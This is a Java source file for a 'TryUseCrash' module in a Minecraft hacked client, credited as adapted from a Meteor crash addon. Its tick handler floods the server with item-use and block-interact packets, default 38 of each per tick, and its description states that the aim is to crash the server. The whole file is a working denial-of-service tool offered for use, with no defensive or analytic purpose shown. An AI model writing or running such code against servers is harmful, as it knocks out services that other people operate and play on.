package kult.klient.systems.modules.crash;

import kult.klient.eventbus.EventHandler;
import kult.klient.events.game.GameLeftEvent;
import kult.klient.events.world.TickEvent;
import kult.klient.settings.BoolSetting;
import kult.klient.settings.IntSetting;
import kult.klient.settings.Setting;
import kult.klient.settings.SettingGroup;
import kult.klient.systems.modules.Categories;
import kult.klient.systems.modules.Module;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

/*/--------------------------------------------------------------------------------------------------------------------------/*/
/*/ Used from Meteor Crash Addon by Wide Cat                                                                                 /*/
/*/ https://github.com/Wide-Cat/meteor-crash-addon/blob/main/src/main/java/widecat/meteorcrashaddon/modules/TryUseCrash.java /*/
/*/--------------------------------------------------------------------------------------------------------------------------/*/

public class TryUseCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    // General

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("How many packets to send per tick.")
        .defaultValue(38)
        .min(1)
        .sliderRange(1, 100)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(false)
        .build()
    );

    public TryUseCrash() {
        super(Categories.Crash, Items.STICK, "try-use-crash", "Tries to crash the server by spamming use packets. (By 0x150)");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.getNetworkHandler() == null) return;

        for (int i = 0; i < packets.get(); i++) {
            BlockHitResult blockHitResult = new BlockHitResult(new Vec3d(.5, .5, .5), Direction.DOWN, mc.player.getBlockPos(), false);
            PlayerInteractItemC2SPacket packet = new PlayerInteractItemC2SPacket(Hand.MAIN_HAND);
            PlayerInteractBlockC2SPacket packet1 = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult);
            mc.getNetworkHandler().sendPacket(packet);
            mc.getNetworkHandler().sendPacket(packet1);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
